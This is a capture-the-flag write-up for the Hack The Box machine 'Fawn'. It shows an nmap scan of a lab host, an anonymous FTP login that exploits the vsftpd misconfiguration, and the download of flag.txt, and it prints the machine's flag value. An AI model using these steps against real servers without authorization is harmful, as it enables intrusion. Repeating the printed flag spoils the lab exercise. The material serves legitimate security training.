# Hack The Box Machines: Fawn
Once the machine is spawn, let's scan de services and their versions running in the target machine with **nmap**.

```sh
❯ target=10.129.245.135
❯ nmap -sV $target
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-13 16:08 CEST
Nmap scan report for 10.129.245.135
Host is up (0.070s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.69 seconds
```

As seen in the scan, there is an open port in the **21** with a **ftp** service running on it, moreover it is the **vsftpd 3.0.3** version.

Now let's try connect to the target machine with the **ftp** service that is preinstalled in linux by default.

```sh
❯ ftp $target
Connected to 10.129.245.135.
220 (vsFTPd 3.0.3)
Name (10.129.245.135:gemonpar): 
```

As seen we send a request of connection to the target machine and this send us back an authentication request.

If we search for vulnerabilities in ftp services, there is a misconfiguration that allows an **anonymous** person to login with no password need.

```sh
❯ ftp $target
Connected to 10.129.245.135.
220 (vsFTPd 3.0.3)
Name (10.129.245.135:gemonpar): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

As seen, the login is successful, so now lets see which commands are allowed the **help** command.

```sh
ftp> help
Commands may be abbreviated.  Commands are:

!		dir		mdelete		qc		site
$		disconnect	mdir		sendport	size
account		exit		mget		put		status
append		form		mkdir		pwd		struct
ascii		get		mls		quit		system
bell		glob		mode		quote		sunique
binary		hash		modtime		recv		tenex
bye		help		mput		reget		tick
case		idle		newer		rstatus		trace
cd		image		nmap		rhelp		type
cdup		ipany		nlist		rename		user
chmod		ipv4		ntrans		reset		umask
close		ipv6		open		restart		verbose
cr		lcd		prompt		rmdir		?
delete		ls		passive		runique
debug		macdef		proxy		send
```
So if we make an **ls** we see a **flag.txt** let's download this file and show his content.

```sh
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04 03:25 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
32 bytes received in 0.00 secs (343.4066 kB/s)
ftp> exit
221 Goodbye.
❯ cat flag.txt
       │ File: flag.txt
   1   │ 035db21c881520061c53e0536e44f815
```

Finally there is the flag **035db21c881520061c53e0536e44f815**.
